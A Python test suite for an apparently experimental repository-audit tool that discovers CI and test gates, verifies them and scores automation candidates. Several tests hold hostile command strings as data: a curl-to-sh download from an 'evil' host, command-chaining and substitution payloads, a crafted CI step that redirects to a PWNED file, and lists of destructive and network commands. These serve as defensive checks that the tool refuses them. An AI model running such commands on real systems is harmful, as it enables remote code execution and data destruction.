#!/usr/bin/env python3
"""Tests for conservative repository automation discovery."""

import json
import os
import sys
import tempfile

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SRC = os.path.join(ROOT, "src")
if SRC not in sys.path:
    sys.path.insert(0, SRC)

from super_looper.cli import main as cli_main  # noqa: E402
from super_looper.experimental.repo_audit import (  # noqa: E402
    audit_repo,
    default_promotion_out_dir,
    render_ranked_backlog,
    render_recommendations,
    verify_gate_inventory,
    _add_gate,
    _classify_gate_failure,
    _classify_command,
    _consolidate_gates,
    _make_gate,
    _has_shell_control_metacharacters,
    _is_destructive,
    _requires_network,
)


def _write(root, rel, text):
    path = os.path.join(root, rel)
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8") as f:
        f.write(text)


def _candidate(audit, cid):
    for item in audit["automation_candidates"]:
        if item["id"] == cid:
            return item
    raise AssertionError(f"missing candidate: {cid}")


def _write_promotable_repo(repo):
    _write(repo, "src/pkg/__init__.py", "")
    _write(repo, "src/pkg/app.py", "def ok():\n    return 1\n")
    _write(repo, "tests/test_pkg.py", "def test_pkg():\n    assert True\n")
    _write(repo, "pyproject.toml", "[tool.pytest.ini_options]\naddopts = '-q'\n[tool.ruff]\nline-length = 100\n")
    _write(
        repo,
        ".github/workflows/tests.yml",
        "jobs:\n"
        "  test:\n"
        "    steps:\n"
        "      - run: python -m pytest tests\n",
    )


def _confirmed_l2_candidate(gate_id):
    return {
        "id": "confirmed-lint-failure-repair",
        "title": "Repair confirmed lint failure in src/",
        "recommended_path": "l2_candidate",
        "max_agent_autonomy": "L2",
        "gate_strength": "medium",
        "evidence_level": "confirmed_failure",
        "hypothesis": False,
        "score": {"total": 70, "leverage": 28, "gate": 28, "effort": 18, "risk_penalty": 4},
        "why": [
            "A concrete failing lint command output was captured.",
            "The repair is bounded to src/ and checked by the same lint gate.",
        ],
        "primary_gates": [gate_id],
        "proposed_verifiers": [],
        "scope_hint": {
            "may_touch": ["src/"],
            "must_not_touch": [".github/workflows/", "release configuration", "credentials"],
        },
        "missing_evidence": [],
        "discovery_questions": [],
        "next_step": "Run one watched repair pass, then share the patch only if the lint gate passes.",
    }


def test_python_repo_discovers_native_gates_and_conservative_candidates():
    with tempfile.TemporaryDirectory() as root:
        _write(root, "src/demo/__init__.py", "")
        _write(root, "src/demo/app.py", "def ok():\n    return 1\n")
        _write(root, "src/demo/cli.py", "def main():\n    return 0\n")
        _write(root, "examples/basic.py", "from demo import ok\n")
        _write(root, "tests/test_app.py", "def test_ok():\n    assert True\n")
        _write(root, "tests/test_cli/test_help.py", "def test_help():\n    assert True\n")
        _write(root, "tests/integrations/test_provider.py", "def test_provider():\n    assert True\n")
        _write(root, "pyproject.toml", "[tool.pytest.ini_options]\naddopts = '-q'\n[tool.ruff]\nline-length = 100\n")
        _write(root, "Makefile", "test:\n\tpython -m pytest\nlint:\n\truff check .\n")
        _write(
            root,
            ".github/workflows/ci.yml",
            "jobs:\n"
            "  test:\n"
            "    steps:\n"
            "      - run: pip install pytest\n"
            "      - run: echo \"Skipping docs build for non-docs changes\"\n"
            "      - run: pip install -e . && python -m pytest\n"
            "      - run: |\n"
            "          python -m pytest \\\n"
            "            tests\n",
        )

        audit = audit_repo(root)

    commands = {gate["command"]: gate for gate in audit["gate_inventory"]}
    assert "python -m pytest" in commands
    assert "ruff check ." in commands
    assert "make test" in commands
    assert commands["python -m pytest"]["strength"] == "strong"
    assert "python -m pytest tests" in commands
    assert not any(gate["command"].startswith("pip install") for gate in audit["gate_inventory"])
    assert not any(gate["command"].startswith("echo ") for gate in audit["gate_inventory"])
    assert not any(gate["command"].endswith("\\") for gate in audit["gate_inventory"])
    assert audit["summary"]["gate_counts"]["strong"] >= 1
    assert audit["summary"]["surface_counts"]["ci_workflow"] == 1
    assert audit["summary"]["surface_counts"]["test_suite"] >= 1
    assert audit["summary"]["surface_counts"]["code_quality"] >= 1
    assert any(surface["title"] == "workflow `.github/workflows/ci.yml`" for surface in audit["repo_surfaces"])

    ci = _candidate(audit, "ci-failure-repair-assistant")
    assert ci["recommended_path"] == "discovery_required"
    assert ci["max_agent_autonomy"] == "L0"
    assert ci["evidence_level"] == "static_gate_only"
    assert "failing CI log" in " ".join(ci["missing_evidence"])
    surface_candidates = [candidate for candidate in audit["automation_candidates"] if candidate.get("surface_id")]
    assert any(candidate["surface_id"].startswith("ci-workflow") for candidate in surface_candidates)
    assert any("workflow `.github/workflows/ci.yml`" in candidate["title"] for candidate in surface_candidates)
    surface_ci = next(candidate for candidate in surface_candidates if candidate["surface_id"].startswith("ci-workflow"))
    assert surface_ci["recommended_path"] == "discovery_required"
    assert surface_ci["evidence_level"] == "static_gate_only"
    assert all(
        candidate["recommended_path"] != "l2_candidate"
        for candidate in audit["automation_candidates"]
        if candidate["evidence_level"] == "static_gate_only"
    )
    assert audit["summary"]["hypothesis_count"] >= 4
    hypotheses = [candidate for candidate in audit["automation_candidates"] if candidate["hypothesis"]]
    assert all(candidate["evidence_level"] == "hypothesis" for candidate in hypotheses)
    assert all(candidate["max_agent_autonomy"] != "L3" for candidate in hypotheses)
    assert any(candidate["id"] == "hypothesis-ci-failure-intelligence" for candidate in hypotheses)
    assert any(candidate["id"] == "hypothesis-cli-contract-smoke" for candidate in hypotheses)
    assert any(candidate["id"] == "hypothesis-example-smoke-suite" for candidate in hypotheses)
    assert any(candidate["id"] == "hypothesis-integration-compatibility-drift" for candidate in hypotheses)
    assert all(candidate["proposed_verifiers"] for candidate in hypotheses)
    assert all(c["max_agent_autonomy"] != "L3" for c in audit["automation_candidates"])


def test_node_repo_discovers_package_scripts():
    with tempfile.TemporaryDirectory() as root:
        _write(root, "package.json", json.dumps({
            "scripts": {
                "test": "vitest run",
                "lint": "eslint .",
                "build": "tsc -p tsconfig.json",
            }
        }))
        _write(root, "pnpm-lock.yaml", "lockfileVersion: '9.0'\n")
        _write(root, "src/index.ts", "export const value = 1\n")

        audit = audit_repo(root)

    commands = {gate["command"] for gate in audit["gate_inventory"]}
    assert "pnpm run test" in commands
    assert "pnpm run lint" in commands
    assert "pnpm run build" in commands
    scheduler = _candidate(audit, "repo-native-verification-scheduler")
    assert scheduler["recommended_path"] == "plain_scheduler"
    assert scheduler["max_agent_autonomy"] == "none"


def test_docs_only_repo_requires_discovery_and_rejects_unscoped_automation():
    with tempfile.TemporaryDirectory() as root:
        _write(root, "README.md", "# Demo\n")
        _write(root, "docs/runbook.md", "Restart the service when it fails.\n")

        audit = audit_repo(root)

    assert audit["summary"]["gate_counts"]["strong"] == 0
    docs = _candidate(audit, "docs-runbook-drift")
    assert docs["recommended_path"] == "discovery_required"
    assert docs["max_agent_autonomy"] == "L0"
    reject = _candidate(audit, "unscoped-improvement-agent")
    assert reject["recommended_path"] == "do_not_automate"


def test_repo_audit_writes_reviewable_artifacts_and_cli_summary():
    with tempfile.TemporaryDirectory() as root:
        repo = os.path.join(root, "repo")
        out = os.path.join(root, "audit")
        os.makedirs(repo)
        _write(repo, "src/pkg/__init__.py", "")
        _write(repo, "tests/test_pkg.py", "def test_pkg():\n    assert True\n")
        _write(repo, "pyproject.toml", "[tool.pytest.ini_options]\n")

        rc = cli_main(["repo", "audit", "--repo-path", repo, "--out", out])
        assert rc == 0

        for name in (
            "repo-audit.json",
            "gate-inventory.json",
            "repo-surfaces.json",
            "automation-leads.json",
            "loop-hypotheses.json",
            "automation-candidates.json",
            "ranked-backlog.md",
            "recommendations.md",
        ):
            assert os.path.exists(os.path.join(out, name)), name
        with open(os.path.join(out, "repo-audit.json"), encoding="utf-8") as f:
            audit = json.load(f)

    assert audit["mode"] == "repo-automation-discovery"
    assert audit["automation_candidates"][0]["score"]["total"] >= audit["automation_candidates"][-1]["score"]["total"]


def test_verify_gate_inventory_records_pass_fail_and_skips_unsafe():
    with tempfile.TemporaryDirectory() as repo:
        gates = [
            {
                "id": "gate-pass",
                "command": f"{sys.executable} -c \"raise SystemExit(0)\"",
                "requires_network": False,
                "destructive": False,
            },
            {
                "id": "gate-fail",
                "command": f"{sys.executable} -c \"raise SystemExit(7)\"",
                "requires_network": False,
                "destructive": False,
            },
            {
                "id": "gate-network",
                "command": f"{sys.executable} -c \"raise SystemExit(0)\"",
                "requires_network": True,
                "destructive": False,
            },
        ]
        verified = verify_gate_inventory(repo, gates, timeout_seconds=10)
    by_id = {gate["id"]: gate["verification"] for gate in verified}
    strengths = {gate["id"]: gate["confirmed_strength"] for gate in verified}
    assert by_id["gate-pass"]["status"] == "passed"
    assert by_id["gate-pass"]["exit_code"] == 0
    assert strengths["gate-pass"] == "weak"
    assert by_id["gate-fail"]["status"] == "failed"
    assert by_id["gate-fail"]["exit_code"] == 7
    assert strengths["gate-fail"] == "failed"
    assert by_id["gate-network"]["status"] == "skipped_requires_network"
    assert strengths["gate-network"] == "unverified"


def test_verify_gate_inventory_refuses_shell_control_commands():
    # A crafted "verifier" gate that smuggles a redirect/pipe/chain must never be
    # handed to shell=True. The network/destructive substring skips are evadable,
    # so the shell-control refusal is the hard boundary.
    with tempfile.TemporaryDirectory() as repo:
        marker = os.path.join(repo, "PWNED.txt")
        payloads = {
            "redirect": f'{sys.executable} -c "pass" > PWNED.txt',
            "chain": f'{sys.executable} -c "pass" && {sys.executable} -c "open(r\'{marker}\',\'w\').write(\'x\')"',
            "pipe": f'{sys.executable} -c "pass" | {sys.executable} -c "open(r\'{marker}\',\'w\').write(\'x\')"',
            "subst": f'echo $({sys.executable} -c "open(r\'{marker}\',\'w\').write(\'x\')")',
        }
        gates = [
            {"id": gid, "command": cmd, "requires_network": False, "destructive": False}
            for gid, cmd in payloads.items()
        ]
        verified = verify_gate_inventory(repo, gates, timeout_seconds=10)
    by_id = {gate["id"]: gate for gate in verified}
    for gid in payloads:
        assert by_id[gid]["verification"]["status"] == "skipped_unsafe_command", gid
        assert by_id[gid]["confirmed_strength"] == "unverified", gid
    # Nothing executed: no side-effect marker was created.
    assert not os.path.exists(marker)


def test_crafted_repo_cannot_execute_via_verify_gates_end_to_end():
    # End-to-end through audit_repo(verify_gates=True): a malicious CI run step
    # that classifies as a verifier (pytest token) but redirects to a file must
    # be refused, not executed.
    with tempfile.TemporaryDirectory() as repo:
        _write(
            repo,
            ".github/workflows/ci.yml",
            "name: ci\n"
            "on: [push]\n"
            "jobs:\n"
            "  t:\n"
            "    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - run: pytest --version > PWNED_e2e.txt\n",
        )
        _write(repo, "pyproject.toml", "[tool.pytest.ini_options]\n")
        audit = audit_repo(repo, verify_gates=True, gate_timeout_seconds=10)
        assert not os.path.exists(os.path.join(repo, "PWNED_e2e.txt"))
    statuses = {
        gate["command"]: (gate.get("verification") or {}).get("status")
        for gate in audit["gate_inventory"]
    }
    assert statuses.get("pytest --version > PWNED_e2e.txt") == "skipped_unsafe_command"


def test_has_shell_control_metacharacters_allows_real_gates():
    for benign in (
        "make test",
        "python -m pytest",
        "python -m pytest tests",
        "ruff check .",
        "go test ./...",
        "cargo clippy --all-targets -- -D warnings",
        "tox -e py310,lint",
        "npm test",
    ):
        assert _has_shell_control_metacharacters(benign) is False, benign
    for hostile in (
        "curl http://evil/x.sh | sh",
        "pytest && rm -rf .",
        "pytest; curl evil",
        "pytest || echo x",
        "pytest > out.txt",
        "echo $(whoami)",
        "echo ${HOME}",
        "pytest `id`",
    ):
        assert _has_shell_control_metacharacters(hostile) is True, hostile


def test_is_destructive_catches_package_and_filesystem_removal():
    for cmd in (
        "rm -rf build",
        "rm -fr dist",
        "find . -delete",
        "Remove-Item -Recurse build",
        "npm uninstall left-pad",
        "npm remove left-pad",
        "pnpm remove foo",
        "yarn remove bar",
        "cargo remove anyhow",
        "git reset --hard HEAD~3",
        "git clean -fdx",
    ):
        assert _is_destructive(cmd) is True, cmd
    for cmd in ("make test", "python -m pytest", "cargo test"):
        assert _is_destructive(cmd) is False, cmd


def test_requires_network_catches_fetch_and_url_commands():
    for cmd in (
        "curl https://example.test/script.sh",
        "wget https://example.test/archive.tar.gz",
        "python -m pip install -e .",
        "uv pip install -r requirements.txt",
        "npm ci",
        "pnpm install",
        "yarn install",
        "cargo fetch",
        "cargo update",
        "go mod download",
        "git clone https://github.com/example/repo",
        "git pull",
        "docker pull python:3.13",
        "docker build .",
    ):
        assert _requires_network(cmd) is True, cmd
    for cmd in ("make test", "python -m pytest", "cargo test", "go test ./..."):
        assert _requires_network(cmd) is False, cmd


def test_verify_gate_inventory_skips_detected_network_and_destructive_commands():
    with tempfile.TemporaryDirectory() as repo:
        marker = os.path.join(repo, "SHOULD_NOT_EXIST.txt")
        destructive = {
            "id": "gate-destructive",
            "command": f"{sys.executable} -c \"raise SystemExit(0)\"",
            "requires_network": False,
            "destructive": True,
        }
        network = {
            "id": "gate-network-url",
            "command": "curl https://example.test/SHOULD_NOT_RUN",
            "requires_network": _requires_network("curl https://example.test/SHOULD_NOT_RUN"),
            "destructive": False,
        }
        verified = verify_gate_inventory(repo, [destructive, network], timeout_seconds=10)
    by_id = {gate["id"]: gate for gate in verified}
    assert by_id["gate-destructive"]["verification"]["status"] == "skipped_destructive"
    assert by_id["gate-destructive"]["confirmed_strength"] == "unverified"
    assert by_id["gate-network-url"]["verification"]["status"] == "skipped_requires_network"
    assert by_id["gate-network-url"]["confirmed_strength"] == "unverified"
    assert not os.path.exists(marker)


def test_verify_gate_inventory_recomputes_unsafe_flags_from_command():
    # verify_gate_inventory is an execution boundary, so it must not trust stale
    # or user-supplied safety flags on a gate dict.
    with tempfile.TemporaryDirectory() as repo:
        gates = [
            {
                "id": "network-flag-lied",
                "command": "curl https://example.test/SHOULD_NOT_RUN",
                "requires_network": False,
                "destructive": False,
            },
            {
                "id": "destructive-flag-lied",
                "command": "rm -rf SHOULD_NOT_RUN",
                "requires_network": False,
                "destructive": False,
            },
        ]
        verified = verify_gate_inventory(repo, gates, timeout_seconds=10)
    by_id = {gate["id"]: gate for gate in verified}
    assert by_id["network-flag-lied"]["verification"]["status"] == "skipped_requires_network"
    assert by_id["network-flag-lied"]["requires_network"] is True
    assert by_id["destructive-flag-lied"]["verification"]["status"] == "skipped_destructive"
    assert by_id["destructive-flag-lied"]["destructive"] is True


def test_classify_gate_failure_distinguishes_environment_from_real_failure():
    assert _classify_gate_failure(
        "nox -s tests",
        stderr="'nox' is not recognized as an internal or external command",
    ) == "tool_missing"
    assert _classify_gate_failure(
        "python -m nox -s lint",
        stderr="No module named nox",
    ) == "tool_missing"
    assert _classify_gate_failure(
        "npm test",
        stderr="'xo' is not recognized as an internal or external command",
    ) == "setup_required"
    assert _classify_gate_failure(
        "python -m pytest",
        stderr="ERROR tests/test_app.py\nInterrupted: 2 errors during collection\nModuleNotFoundError: No module named 'flask'",
    ) == "setup_required"
    assert _classify_gate_failure(
        "python -m build .",
        stderr="HTTPSConnection(host='pypi.org', port=443): Failed to establish a new connection",
    ) == "network_blocked"
    assert _classify_gate_failure(
        "cargo test",
        stderr=(
            "failed to download from `https://index.crates.io/config.json`\n\n"
            "Caused by:\n"
            "  [7] Could not connect to server (Failed to connect to "
            "index.crates.io port 443 after 0 ms: Could not connect to server)"
        ),
    ) == "network_blocked"
    assert _classify_gate_failure(
        "python -m pytest",
        stderr="FAILED tests/test_app.py::test_app - AssertionError",
    ) == "failed"


def test_classify_gate_failure_toolchain_and_permission():
    # rust-lang/log style: nightly-only -Z flag run under stable cargo.
    assert _classify_gate_failure(
        "cargo build --verbose -Z minimal-versions --features kv",
        stderr=(
            "error: the `-Z` flag is only accepted on the nightly channel of "
            "Cargo, but this is the `stable` channel"
        ),
    ) == "toolchain_required"
    # rustup selecting an uninstalled toolchain.
    assert _classify_gate_failure(
        "cargo +nightly test",
        stderr="error: toolchain 'nightly-x86_64-pc-windows-gnu' is not installed",
    ) == "toolchain_required"
    # dtolnay/anyhow style: rustup could not create a temp file (Windows).
    assert _classify_gate_failure(
        "cargo test",
        stderr=(
            "info: syncing channel updates for 'stable-x86_64-pc-windows-gnu'\n"
            "error: could not create temp file "
            "C:\\Users\\jpmah\\.rustup\\tmp\\or54jc8qyyym2e7d_file: Access is denied. (os error 5)"
        ),
    ) == "permission_blocked"
    # Generic POSIX permission denial.
    assert _classify_gate_failure(
        "make test",
        stderr="/bin/sh: ./run.sh: Permission denied",
    ) == "permission_blocked"
    # Network classification still wins for crates.io fetch failures.
    assert _classify_gate_failure(
        "cargo test",
        stderr="Updating crates.io index\nwarning: spurious network error: Could not connect to server",
    ) == "network_blocked"
    # A genuine compile/test failure is still 'failed', not a false toolchain hit.
    assert _classify_gate_failure(
        "cargo test",
        stderr="error[E0277]: the trait bound is not satisfied\nerror: could not compile `log`",
    ) == "failed"


def test_recommendations_include_environment_readiness_after_verify():
    with tempfile.TemporaryDirectory() as root:
        repo = os.path.join(root, "repo")
        os.makedirs(repo)
        _write(repo, "tests/test_pkg.py", "def test_pkg():\n    assert True\n")
        _write(repo, "pyproject.toml", "[tool.pytest.ini_options]\n")
        audit = audit_repo(repo, verify_gates=True, gate_timeout_seconds=30)
    text = render_recommendations(audit)
    assert "## Environment Readiness (verified pass)" in text
    assert "Gates confirmed passing:" in text


def test_recommendations_omit_environment_readiness_without_verify():
    with tempfile.TemporaryDirectory() as root:
        repo = os.path.join(root, "repo")
        os.makedirs(repo)
        _write(repo, "tests/test_pkg.py", "def test_pkg():\n    assert True\n")
        _write(repo, "pyproject.toml", "[tool.pytest.ini_options]\n")
        audit = audit_repo(repo, verify_gates=False)
    text = render_recommendations(audit)
    assert "## Environment Readiness" not in text


def test_repo_audit_verify_gates_confirms_discovered_pytest_gate():
    with tempfile.TemporaryDirectory() as root:
        repo = os.path.join(root, "repo")
        os.makedirs(repo)
        _write(repo, "tests/test_pkg.py", "def test_pkg():\n    assert True\n")
        _write(repo, "pyproject.toml", "[tool.pytest.ini_options]\n")
        audit = audit_repo(repo, verify_gates=True, gate_timeout_seconds=30)
    counts = audit["summary"]["gate_verification_counts"]
    assert counts.get("passed", 0) >= 1
    pytest_gate = next(g for g in audit["gate_inventory"] if g["command"] == "python -m pytest")
    assert pytest_gate["verification"]["status"] == "passed"


def test_repo_audit_verify_gates_downgrades_candidates_when_primary_gate_fails():
    with tempfile.TemporaryDirectory() as root:
        repo = os.path.join(root, "repo")
        os.makedirs(repo)
        _write(repo, "tests/test_pkg.py", "def test_pkg():\n    assert False\n")
        _write(repo, "pyproject.toml", "[tool.pytest.ini_options]\n")
        static = audit_repo(repo)
        verified = audit_repo(repo, verify_gates=True, gate_timeout_seconds=30)

    static_scheduler = _candidate(static, "repo-native-verification-scheduler")
    verified_scheduler = _candidate(verified, "repo-native-verification-scheduler")
    pytest_gate = next(g for g in verified["gate_inventory"] if g["command"] == "python -m pytest")

    assert pytest_gate["verification"]["status"] == "failed"
    assert pytest_gate["confirmed_strength"] == "failed"
    assert verified_scheduler["confirmed_gate_strength"] == "failed"
    assert verified_scheduler["score"]["total"] < static_scheduler["score"]["total"]
    assert verified_scheduler["static_score"] == static_scheduler["score"]
    assert any("must pass" in item for item in verified_scheduler["missing_evidence"])
    backlog = render_ranked_backlog(verified)
    assert "Static Gate" in backlog
    assert "Confirmed Gate" in backlog
    assert "`failed`" in backlog


def test_repo_promote_writes_clean_case_study_taxonomy_for_static_candidate():
    with tempfile.TemporaryDirectory() as root:
        repo = os.path.join(root, "repo")
        audit_dir = os.path.join(root, "audit")
        promote_dir = os.path.join(root, "promotions", "pkg-tests")
        os.makedirs(repo)
        _write_promotable_repo(repo)

        assert cli_main(["repo", "audit", "--repo-path", repo, "--out", audit_dir]) == 0
        with open(os.path.join(audit_dir, "repo-audit.json"), encoding="utf-8") as f:
            audit = json.load(f)
        lint_gate = next(gate for gate in audit["gate_inventory"] if gate["command"] == "ruff check .")
        candidate = _confirmed_l2_candidate(lint_gate["id"])
        audit["automation_candidates"].insert(0, candidate)
        with open(os.path.join(audit_dir, "repo-audit.json"), "w", encoding="utf-8") as f:
            json.dump(audit, f, indent=2)
            f.write("\n")

        rc = cli_main([
            "repo",
            "promote",
            "--audit",
            os.path.join(audit_dir, "repo-audit.json"),
            "--candidate",
            candidate["id"],
            "--out",
            promote_dir,
            "--repo",
            "https://example.test/org/pkg",
            "--name",
            "pkg-tests-promotion",
        ])

        assert rc == 0
        expected = (
            "case-study.json",
            "inputs/audit-summary.json",
            "inputs/candidate.json",
            "inputs/answers.json",
            "inputs/promotion.json",
            "design/loop.json",
            "design/design-report.json",
            "proof/verifier-plan.md",
            "proof/scope.md",
            "proof/runner-plan.md",
            "proof/runs",
            "reports/maintainer-brief.md",
            "reports/promotion-summary.md",
        )
        for rel in expected:
            assert os.path.exists(os.path.join(promote_dir, *rel.split("/"))), rel

        with open(os.path.join(promote_dir, "case-study.json"), encoding="utf-8") as f:
            manifest = json.load(f)
        assert manifest["name"] == "pkg-tests-promotion"
        assert manifest["repo"] == "https://example.test/org/pkg"
        assert manifest["answers"] == "inputs/answers.json"
        assert manifest["loop_spec"] == "design/loop.json"
        assert manifest["design_report"] == "design/design-report.json"
        assert manifest["runs_dir"] == "proof/runs"
        assert manifest["promotion"] == "inputs/promotion.json"

        with open(os.path.join(promote_dir, "inputs", "promotion.json"), encoding="utf-8") as f:
            promotion = json.load(f)
        assert promotion["mode"] == "repo-candidate-promotion"
        assert promotion["proof_status"] == "case_study_ready"
        assert promotion["design_verdict"] == "AUTONOMOUS_LOOP"
        assert promotion["taxonomy"]["root"] == ["case-study.json"]
        assert promotion["taxonomy"]["inputs"] == [
            "audit-summary.json",
            "candidate.json",
            "answers.json",
            "promotion.json",
        ]
        assert "runner-plan.md" in promotion["taxonomy"]["proof"]
        assert "maintainer-brief.md" in promotion["taxonomy"]["reports"]
        with open(os.path.join(promote_dir, "reports", "maintainer-brief.md"), encoding="utf-8") as f:
            maintainer_brief = f.read()
        assert "Repository: `https://example.test/org/pkg`" in maintainer_brief

        auto_root = os.path.join(root, "auto-promotions")
        auto_expected = default_promotion_out_dir(
            os.path.join(audit_dir, "repo-audit.json"),
            candidate["id"],
            out_root=auto_root,
            repo="https://example.test/org/pkg",
        )
        rc = cli_main([
            "repo",
            "promote",
            "--audit",
            os.path.join(audit_dir, "repo-audit.json"),
            "--candidate",
            candidate["id"],
            "--out-root",
            auto_root,
            "--repo",
            "https://example.test/org/pkg",
        ])
        assert rc == 0
        assert os.path.exists(os.path.join(auto_expected, "case-study.json"))


def test_repo_promote_keeps_hypotheses_as_discovery_packets():
    with tempfile.TemporaryDirectory() as root:
        repo = os.path.join(root, "repo")
        audit_dir = os.path.join(root, "audit")
        promote_dir = os.path.join(root, "promotions", "hypothesis")
        os.makedirs(repo)
        _write_promotable_repo(repo)

        assert cli_main(["repo", "audit", "--repo-path", repo, "--out", audit_dir]) == 0
        with open(os.path.join(audit_dir, "repo-audit.json"), encoding="utf-8") as f:
            audit = json.load(f)
        candidate = next(item for item in audit["automation_candidates"] if item.get("hypothesis"))
        _write(promote_dir, "design/loop.json", "{}\n")

        rc = cli_main([
            "repo",
            "promote",
            "--audit",
            os.path.join(audit_dir, "repo-audit.json"),
            "--candidate",
            candidate["id"],
            "--out",
            promote_dir,
        ])

        assert rc == 0
        assert not os.path.exists(os.path.join(promote_dir, "design", "loop.json"))
        with open(os.path.join(promote_dir, "inputs", "candidate.json"), encoding="utf-8") as f:
            promoted_candidate = json.load(f)
        assert promoted_candidate["hypothesis"] is True
        with open(os.path.join(promote_dir, "inputs", "promotion.json"), encoding="utf-8") as f:
            promotion = json.load(f)
        assert promotion["proof_status"] == "hypothesis_discovery"
        assert promotion["design_verdict"] == "DISCOVERY_REQUIRED"
        with open(os.path.join(promote_dir, "design", "design-report.json"), encoding="utf-8") as f:
            design_report = json.load(f)
        assert design_report["report"]["verdict"] == "DISCOVERY_REQUIRED"


def test_script_name_match_is_word_boundary():
    # #9: a script named "latest" must NOT register as a `test` gate (no substring match); "test" must.
    with tempfile.TemporaryDirectory() as root:
        repo = os.path.join(root, "repo")
        _write(repo, "package.json", json.dumps({"scripts": {"latest": "release.sh", "test": "jest"}}))
        audit = audit_repo(repo)
        commands = {gate["command"] for gate in audit["gate_inventory"]}
        assert any("test" in command for command in commands), commands
        assert not any("latest" in command for command in commands), commands


# ---- gate hygiene (dogfood findings: dedup, CI interpolation, non-verifier tasks) ----

def test_add_gate_dedupes_same_command_across_sources():
    gates = []
    _add_gate(gates, "make test", "Makefile", "x")
    _add_gate(gates, "make test", ".github/workflows/ci.yml", "y")
    _add_gate(gates, "make test", ".github/workflows/macos.yml", "z")
    assert len(gates) == 1, [g.command for g in gates]


def test_add_gate_rejects_ci_template_interpolation():
    gates = []
    _add_gate(gates, "tox run -e ${{ matrix.tox_env }} --installpkg `find dist/*.tar.gz`", ".github/workflows/test.yml", "x")
    _add_gate(gates, "${{ env.CARGO }} build --workspace", ".github/workflows/ci.yml", "x")
    assert gates == [], [g.command for g in gates]


def test_add_gate_rejects_non_verifier_release_tasks():
    gates = []
    _add_gate(gates, "tox -e prepare-release-pr -- main --major", ".github/workflows/a.yml", "x")
    _add_gate(gates, "tox -e generate-gh-release-notes -- v1", ".github/workflows/b.yml", "x")
    _add_gate(gates, "tox -e update-plugin-list", ".github/workflows/c.yml", "x")
    assert gates == [], [g.command for g in gates]


def test_classify_normalizes_run_wrapper():
    assert _classify_command("yarn run test") == "test"
    assert _classify_command("yarn test") == "test"
    assert _classify_command("npm run typecheck") == "typecheck"


def test_yarn_run_test_dedupes_and_is_test_strength():
    gates = []
    _add_gate(gates, "yarn test", ".github/workflows/ci.yml", "x")
    _add_gate(gates, "yarn run test", "package.json", "y")
    assert len(gates) == 1, [g.command for g in gates]
    assert gates[0].category == "test" and gates[0].strength == "strong", gates[0]


# ---- #5: a fuzz run is not a clean deterministic gate ----

def test_fuzz_run_is_not_a_strong_gate():
    g = _make_gate("go test ./src/algo/ -fuzz=FuzzX -fuzztime=5s", ".github/workflows/linux.yml", "x")
    assert g.category == "test" and g.strength == "weak", g
    plain = _make_gate("go test ./...", "go.mod", "x")
    assert plain.strength == "strong", plain


# ---- #4: consolidate npm/yarn/pnpm script `:`-variants ----

def test_consolidate_collapses_script_variants():
    gates = [
        _make_gate("yarn test", ".github/workflows/ci.yml", "x"),
        _make_gate("yarn test:production", "package.json", "x"),
        _make_gate("yarn test:production:browser:chrome", "package.json", "x"),
        _make_gate("cargo test", "Cargo.toml", "x"),  # non-script -> untouched
    ]
    out = _consolidate_gates(gates)
    cmds = [g.command for g in out]
    assert "yarn test" in cmds, cmds                      # the base survives
    assert "yarn test:production" not in cmds, cmds        # variants collapsed
    assert "cargo test" in cmds, cmds                      # non-script kept
    yarn_test = [g for g in out if g.command == "yarn test"][0]
    assert "variant" in yarn_test.rationale.lower(), yarn_test.rationale  # notes the dropped variants


# ---- promotion --answers supplement: a human fills the gaps so a lead qualifies ----

def test_repo_promote_with_answers_supplement_qualifies_to_loop():
    with tempfile.TemporaryDirectory() as root:
        repo = os.path.join(root, "repo")
        audit_dir = os.path.join(root, "audit")
        promote_dir = os.path.join(root, "promotions", "supplemented")
        os.makedirs(repo)
        _write_promotable_repo(repo)
        assert cli_main(["repo", "audit", "--repo-path", repo, "--out", audit_dir]) == 0
        with open(os.path.join(audit_dir, "repo-audit.json"), encoding="utf-8") as f:
            audit = json.load(f)
        candidate = next(item for item in audit["automation_candidates"] if item.get("hypothesis"))

        human = os.path.join(root, "human.json")
        with open(human, "w", encoding="utf-8") as f:
            json.dump({
                "recurs": True,
                "wrong_result_signal": "pytest exits nonzero",
                "gate_check": "pytest exits 0",
                "finished_state": "the suite passes",
                "evidence": "pytest exits 0",
                "may_touch": ["src/", "tests/"],
                "must_not_touch": ["secrets/"],
                "budget": {"max_runtime_seconds": 600},
                "gate_rung": "tool",
            }, f)

        rc = cli_main([
            "repo", "promote",
            "--audit", os.path.join(audit_dir, "repo-audit.json"),
            "--candidate", candidate["id"],
            "--out", promote_dir,
            "--answers", human,
        ])
        assert rc == 0
        assert os.path.exists(os.path.join(promote_dir, "design", "loop.json")), "human answers should qualify the lead"
        with open(os.path.join(promote_dir, "inputs", "promotion.json"), encoding="utf-8") as f:
            promotion = json.load(f)
        assert promotion["design_verdict"] == "AUTONOMOUS_LOOP", promotion


def test_repo_audit_lives_in_experimental_and_top_level_shim_is_removed():
    """0.7.0 finished the relegation AND dropped the expired shims: the engine lives
    under experimental/, and the old top-level module no longer exists. New code must
    import from super_looper.experimental.repo_audit."""
    import importlib

    canonical = importlib.import_module("super_looper.experimental.repo_audit")
    assert hasattr(canonical, "audit_repo")

    # The expired 0.6.x back-compat shim must be gone in 0.7.0.
    try:
        importlib.import_module("super_looper.repo_audit")
    except ImportError:
        pass
    else:
        raise AssertionError(
            "super_looper.repo_audit shim should be removed in 0.7.0; import from "
            "super_looper.experimental.repo_audit instead"
        )


def _run_all():
    fns = sorted((n, fn) for n, fn in globals().items() if n.startswith("test_") and callable(fn))
    failed = 0
    for name, fn in fns:
        try:
            fn()
            print(f"PASS {name}")
        except AssertionError as e:
            failed += 1
            print(f"FAIL {name}: {e}")
    print(f"\n{len(fns) - failed}/{len(fns)} passed")
    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(_run_all())
